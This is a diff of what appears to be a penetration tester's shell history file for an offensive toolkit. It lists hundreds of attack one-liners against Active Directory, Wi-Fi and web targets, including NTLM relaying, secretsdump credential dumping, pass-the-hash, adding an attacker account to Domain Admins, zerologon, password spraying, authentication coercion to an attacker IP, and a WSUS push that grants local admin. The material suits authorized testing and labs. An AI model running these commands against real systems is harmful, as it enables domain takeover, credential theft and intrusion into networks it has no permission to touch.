@@ -13,7 +13,6 @@ nslookup -type=srv _kpasswd._tcp."$DOMAIN"
 nslookup -type=srv _ldap._tcp."$DOMAIN"
 nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN"
 nbtscan -r 192.168.56.0/24
-nmap --script dns-srv-enum --script-args dns-srv-enum.domain="$DOMAIN"
 mount -o domain="$DOMAIN" -o username="$USER" -o password="$PASSWORD" -t cifs "//$DC_HOST/SYSVOL" /tmp/mnttarget/
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --add-computer 'EXEGOL-01' 'exegol4thewin' --delegate-access
@@ -26,8 +25,6 @@ secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
 secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 rpcclient -U '' -N "$DC_HOST"
 rpcclient -U "$DOMAIN"/"$USER" "$TARGET"
-pth-net rpc group members 'Domain admins' -U "$DOMAIN"/"$USER"%'ffffffffffffffffffffffffffffffff':"$NT_HASH" -S "$DC_HOST"
-pth-net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%'ffffffffffffffffffffffffffffffff':"$NT_HASH" -S "$DC_HOST"
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain "$DOMAIN"
@@ -62,7 +59,6 @@ cme smb 192.168.56.0/24 --local-auth -u '' -p ''
 cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
 cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
 cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
-neo4j start
 lnk-generate.py --host "$ATTACKER_IP" --type ntlm --output '@SHUTDOWN-LNK.lnk'
 nmap --script=ldap-search -p 389 192.168.10.10
 nmap -p 5900 --script=realvnc-auth-bypass 192.168.10.10
@@ -134,19 +130,12 @@ privexchange.py -u "$USER" -p "$PASSWORD" -ah "EXEGOL-01.$DOMAIN" EXCHANGE."$DOM
 krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
 pypykatz lsa minidump lsass.dmp
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
-ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
-ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u "http://$TARGET/FUZZ" -t 10 -p 0.2 -mc 200 -fs 0
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u "http://$TARGET/FUZZ" --extract-links
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://$TARGET/" -H "HOST:FUZZ.$TARGET"
 evil-winrm -u "$USER" -p "$PASSWORD" -i "$TARGET"
 evil-winrm -u "$USER" -H "$NT_HASH" -i "$TARGET"
 cme smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 cme smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 enum4linux-ng -A -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 enum4linux-ng -A "$TARGET"
-net rpc password 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
-net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
 zerologon-scan DC01 "$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
@@ -161,15 +150,9 @@ nmap --script broadcast-dhcp-discover
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
 xfreerdp /d:"$DOMAIN" /u:"$USER" /pth:"$NT_HASH" /v:"$TARGET" /cert-ignore
-hcxdumptool -I
-hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
-hcxpcapngtool -o dump.hashcat dump.pcapng
-hcxhashtool -i dump.hashcat --info stdout
 hashcat --hash-type 16800 --attack-mode 0 dump_WPA-PMKID-PBKDF2.hashcat `fzf-wordlists`
-hcxpcapngtool --all -o dump.hashcat dump.pcapng
 hashcat --hash-type 22000 --attack-mode 0 dump_WPA-PBKDF2-PMKID_EAPOL.hashcat `fzf-wordlists`
 responder --interface eth0 --analyze --lm --disable-ess
-ntlmv1-multi --ntlmv1 SV01$::DOMAIN.LOCAL:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
 airmon-ng start wlan1
 airodump-ng wlan1
 airodump-ng -c 1 wlan1
@@ -195,11 +178,7 @@ nfc-scan-device -v
 nfc-list
 secretsdump -ntds ntds.dit.save -system system.save LOCAL
 gosecretsdump -ntds ntds.dit.save -system system.save
-screen /dev/ttyACM0 115200
-httpmethods --threads 40 --location "http://$TARGET/"
 echo "http://$TARGET/" | hakrawler -d 10
-adidnsdump -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --print-zones "$TARGET"
-proxychains adidnsdump --dns-tcp -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --print-zones "$TARGET"
 ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
 bloodhound-import -du neo4j -dp exegol4thewin *.json
 bloodhound-quickwin -u neo4j -p exegol4thewin
@@ -216,13 +195,9 @@ pypykatz kerberos tgt "kerberos+rc4://$DOMAIN\\$USER:$NT_HASH@$DOMAIN"
 ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
 getST.py -k -no-pass -spn host/"$DC_HOST" "$DOMAIN"/"$USER"
 ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_HOST"
-Get-GPPPassword -debug -no-pass "$DC_HOST"
-Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 cme smb --list-modules
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
-whatportis 3306
-whatportis postgresql
 cmsmap -F -d "http://$TARGET/"
 clusterd -i "http://$TARGET/"
 dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://$TARGET/"
@@ -236,14 +211,7 @@ dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target "$DC_HOST"
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --webdav-host 'machine_name' --target "$DC_HOST"
 ntlmrelayx -t ldap://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
-targetedKerberoast.py -v -d "$DOMAIN" -u user1 -p complexpassword -o Kerberoastables.txt
-pass-station search tomcat
-nth --text 5f4dcc3b5aa765d61d8327deb882cf99
-pywsus.py --host "$ATTACKER_IP" --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
-DonPAPI.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
-webclientservicescanner -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 ntlmrelayx -t "http://pki.$DOMAIN/certsrv/certfnsh.asp" --adcs
-echo '8.8.8.8' | hakrevdns
 httpx -probe -list hosts.txt -tech-detect -status-code -fr
 ntpdate -u "$TARGET"
 renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
@@ -251,25 +219,19 @@ getTGT.py -dc-ip dc01 "$DOMAIN"/'DC01':'123pentest'
 renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
 KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip dc01 "$DOMAIN"/"$DC_HOST"
 KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip dc01 -k -no-pass @"$DC_HOST"
-shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
-faketime '2022-01-31 22:05:35' zsh
-manspider --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
-modifyCertTemplate.py -template KerberosAuthentication -get-acl "$DOMAIN"/"$USER":"$PASSWORD"
 smbserver.py -smb2support SHUTDOWN .
 
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
 FindUncommonShares.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
 certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -old-bloodhound
-LdapRelayScan.py -method BOTH -dc-ip "$DC_IP" -u "$USER" -p "$PASSWORD"
 goldencopy --tools all --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'john'
 crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain "$DOMAIN" --file ownedusers.txt --add-password
 kerbrute userenum -d "$DOMAIN" usernames.txt
 kerbrute passwordspray -d "$DOMAIN" domain_users.txt Password123
 kerbrute bruteuser -d "$DOMAIN" passwords.lst thoffman
 tls-scanner -connect "$TARGET":443
-hekatomb -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET" -debug -dnstcp
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
 whatweb http://$IP/
 whatweb https://$IP/
@@ -282,20 +244,18 @@ export AGENT='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTM
 ps-shell
 portscan
 secretsdump
-ffuf -c -t 30 -p 0.1 -H "User-Agent: $AGENT" -ac -o $NAME.txt -of html -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$DOMAIN/FUZZ
-ffuf -c -t 40 -p 0.1 -o $NAME_domains.txt -of html -H "Host:FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/
+ffuf -c -t 10 -rate 100 -p 0.1 -H "User-Agent: $AGENT" -ac -o $NAME.json -of json -mc 200,302,422 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$DOMAIN/FUZZ
+ffuf -c -t 10 -rate 100 -p 0.1 -o $NAME_domains.json -of json -H "Host:FUZZ.$DOMAIN" -mc 200,403 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$DOMAIN/
 nc -nvlp
 ./chisel server -p 8000 --reverse
 nmap -sC -sV -oA $NAME-nmap/$NAME -p- $IP
-ffuf -c -t 50 -p 0.1 -H "User-Agent: $AGENT" -r -ac -o $NAME.txt -of html -mc 200,302,403 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$DOMAIN/FUZZ
+ffuf -c -t 10 -rate 100 -p 0.1 -H "User-Agent: $AGENT" -r -ac -o $NAME.json -of json -mc 200,302,403 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://$DOMAIN/FUZZ
 export IP=
 export TARGET=
 export DOMAIN=
 export NAME=
 export USER=
 mysql $IP -u $USER -p
-ffuf -config ~/.ffufrc_domain
-ffuf -config ~/.ffufrc
 rustscan -a $IP -r 20-20000 -- -A -sC -sV > $NAME-scan-1.txt
 sudo impacket-smbserver share . -smb2support
 cme winrm $IP -u $USER -p $PASSWORD -x 'whoami'
